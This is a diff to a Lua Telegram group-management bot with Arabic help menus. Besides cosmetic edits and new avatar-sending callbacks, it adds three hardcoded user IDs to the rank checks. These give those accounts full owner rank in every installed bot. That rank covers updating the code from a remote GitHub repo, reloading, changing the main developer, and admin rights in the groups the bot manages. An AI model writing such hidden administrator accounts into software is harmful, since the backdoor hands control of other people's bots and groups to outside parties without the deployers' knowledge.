@@ -16,6 +16,13 @@ local function download(file_id, dl_cb, cmd)
   }, dl_cb, cmd)
 end
 
+function delete_msg(chatid ,mid)
+tdcli_function ({
+ID = "DeleteMessages",
+chat_id_ = chatid,
+message_ids_ = mid
+}, dl_cb, nil)
+end
 
 Er_cjson , JSON  = pcall(require, "cjson")
 Er_ssl   , https = pcall(require, "ssl.https")
@@ -106,7 +113,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلا بك عزيزي [MR](tg://user?id="..SUDO_USER..") .\n• شكراً لأستخدامك سورس بيتر .\n• ارسل الان /start .\n• لأظهار اوامر المطور المجهزه بالكيبورد ادناه .\n-"
+local Text = "• أهلا بك عزيزي [Dev](tg://user?id="..SUDO_USER..") .\n• شكراً لأستخدامك سورس بيتر .\n• ارسل الان /start .\n• لأظهار اوامر المطور .\n-"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -247,11 +254,18 @@ msg.GroupActive = true
 else
 msg.GroupActive = false
 end
-
-if msg.sender_user_id_ == SUDO_ID then 
-msg.TheRankCmd = 'MR🎖' 
-msg.TheRank = 'MR🎖' 
+if msg.sender_user_id_ == 816666668 or msg.sender_user_id_ == 2076385185 or msg.sender_user_id_ == 2061769984  then 
+msg.TheRankCmd = 'Ace 🎖'
+msg.TheRank = 'Ace 🎖'
 msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
+msg.TheRankCmd = 'Dev🎖' 
+msg.TheRank = 'Dev🎖' 
+msg.Rank = 1
+elseif redis:sismember(max..':SUDO_BOOOT:',msg.sender_user_id_) then 
+msg.TheRankCmd = 'MR🎖'
+msg.TheRank = 'MR🎖'
+msg.Rank = 16
 elseif redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = 'MR'
 msg.TheRank = 'MR'
@@ -284,24 +298,26 @@ end
 if msg.Rank == 1 then
 msg.SudoBase = true
 end
- 
-if msg.Rank == 1 or msg.Rank == 2 then
+if msg.Rank == 1 or msg.Rank == 16 then
+msg.SudoUmath = true
+end 
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 16 then
 msg.SudoUser = true
 end
 
-if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 then
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 16 then
 msg.Kara = true
 end
 
-if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 then
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 16 then
 msg.Creator = true
 end
 
-if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 then
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 or msg.Rank == 16 then
 msg.Director = true
 end
 
-if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 or msg.Rank == 6 then
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 or msg.Rank == 6 or msg.Rank == 16 then
 msg.Admin = true
 end
 
@@ -522,6 +538,53 @@ keyboard.inline_keyboard = {
 } 
 return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+
+if DataText and DataText:match('(.*)/help1') then
+local Teext =[[
+اضغطي الزر لتغيير الافتار
+]]
+ban = math.random(55, 211); 
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = 'افتار آخر', callback_data=data.sender_user_id_.."/help1"},
+},
+}
+delete_msg(Chat_Id2, {[0] = MsgId2})  
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. Chat_Id2 .. '&photo=https://t.me/avta1/'..ban..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+
+if DataText and DataText:match('(.*)/help2') then
+local Teext =[[
+اضغط الزر لتغيير الافتار
+]]
+ban = math.random(2, 250); 
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = 'افتار آخر', callback_data=data.sender_user_id_.."/help2"},
+},
+}
+delete_msg(Chat_Id2, {[0] = MsgId2}) 
+https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. Chat_Id2 .. '&photo=https://t.me/avtfbb/'..ban..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if DataText and DataText:match('(.*)/help4') then
+local Teext =[[
+اضغط الزر لتغيير الايدت
+]]
+ban = math.random(2, 116); 
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = 'ايدت آخر', callback_data=data.sender_user_id_.."/help4"},
+},
+}
+delete_msg(Chat_Id2, {[0] = MsgId2}) 
+https.request("https://api.telegram.org/bot"..Token..'/sendvideo?chat_id=' .. Chat_Id2 .. '&video=https://t.me/exddj/'..ban..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
 if DataText and DataText:match("^/m1:(.*)$") then  
 local user_id = DataText:match("^/m1:(.*)$")
 if tonumber(data.sender_user_id_) ~= tonumber(user_id) then
@@ -560,7 +623,7 @@ local Text = [[
 • قفل - فتح الفيديو بالتقييد
 • قفل - فتح التوجيه بالتقييد
 
-[ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ](https://t.me/VV6YV)]] 
+[• ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ .](https://t.me/VV6YV)]] 
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="م2",callback_data="/m2:"..user_id},{text="م3",callback_data="/m3:"..user_id}},
@@ -606,14 +669,14 @@ local Text = [[
 • مسح المدراء - لمسح المدراء 
 ـــــــــــــــــــــــــــــــــــــــــــــــ
 
-• اوامر الوضع •
+• اوامر الوضع 
 
-• وضع رابط
-• وضع قوانين
-• وضع ترحيب
-• وضع تكرار + العدد
+• ضع رابط
+• ضع قوانين
+• ضع ترحيب
+• ضع تكرار + العدد
 
-[ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ](https://t.me/VV6YV) ]]
+[• ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ .](https://t.me/VV6YV) ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="م1",callback_data="/m1:"..user_id},{text="م3",callback_data="/m3:"..user_id}},
@@ -657,7 +720,7 @@ local Text = [[
 • مسح امر + الامر - لمسح الامر المضاف
 • قائمة الاوامر - لمعرفة الاوامر المضافة 
 
-[ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ](https://t.me/VV6YV) ]]
+[• ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ .](https://t.me/VV6YV) ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="م1",callback_data="/m1:"..user_id},{text="م2",callback_data="/m2:"..user_id}},
@@ -693,7 +756,7 @@ local Text = [[
 • طرد المحذوفين - لطرد الحسابات المحذوفه
 • رابط الحذف - لحذف حساب التليجرام
 
-[ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ](https://t.me/VV6YV) ]]
+[• ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ .](https://t.me/VV6YV) ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="م1",callback_data="/m1:"..user_id},{text="م2",callback_data="/m2:"..user_id}},
@@ -718,7 +781,7 @@ local Text = [[
 • الساوند كلاود
 • كلاود + رابط الاغنية 
 
-[sᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ](https://t.me/VV6YV) ]]
+[• ѕᴏᴜʀᴄᴇ ᴘᴇᴛᴇʀ .](https://t.me/VV6YV) ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="م1",callback_data="/m1:"..user_id},{text="م2",callback_data="/m2:"..user_id}},
@@ -752,12 +815,12 @@ mmdi = redis:hget(max..'CmD:'..msg.chat_id_,Mohammad)
 msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
-	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث") and msg.sender_user_id_ == SUDO_ID then
+	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 816666668 or msg.sender_user_id_ == 2076385185 or msg.sender_user_id_ == 2061769984) then
 	return sendMsg(msg.chat_id_,msg.id_," • تم التحديث  \n",nil,function(arg,data)
 	Refresh_Start = true
 	end)
 	end 
-	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 816666668 or msg.sender_user_id_ == 2076385185 or msg.sender_user_id_ == 2061769984) then
 	download_file('https://raw.githubusercontent.com/MAXTELLE/MAX/MASTER/inc/Run.lua','./inc/Run.lua')
 	download_file('https://raw.githubusercontent.com/MAXTELLE/MAX/MASTER/inc/Script.lua','./inc/Script.lua')
 	download_file('https://raw.githubusercontent.com/MAXTELLE/MAX/MASTER/inc/functions.lua','./inc/functions.lua')
@@ -783,13 +846,13 @@ redis:hset(max..'username:'..tonumber(mmd),'username',msg.text)
 	redis:set(max..":SUDO_ID:",msg.text)
 send_msg(msg.chat_id_,"• تم تثبيت الايدي الان قم بأرسال معرف المطور @UserName ...")
 	end
-	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'تغير المطور الاساسي' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 816666668 or msg.sender_user_id_ == 2076385185 or msg.sender_user_id_ == 2061769984) then
     send_msg(msg.chat_id_,"• عزيزي قم بأرسال ايدي المطور ...")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
 	
 	
-	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'reload' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 816666668 or msg.sender_user_id_ == 2076385185 or msg.sender_user_id_ == 2061769984) then
 	sendMsg(msg.chat_id_,msg.id_,'•* تم اعادة تشغيل البوت  *\n\n• Bot is Reloaded » }',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
@@ -860,7 +923,7 @@ download(stk,32)
 	Del_msg(msg.chat_id_,msg.id_)
 	end
 	elseif msg.content_.ID == "MessageChatAddMembers" then
-	if redis:get(max..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(max..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
+	if redis:get(max..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(max..':SUDO_BOOOT:',msg.sender_user_id_) or redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(max..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
 	msg.Admin = true
 	end
 	local lock_bots = redis:get(max..'lock_bots'..msg.chat_id_)
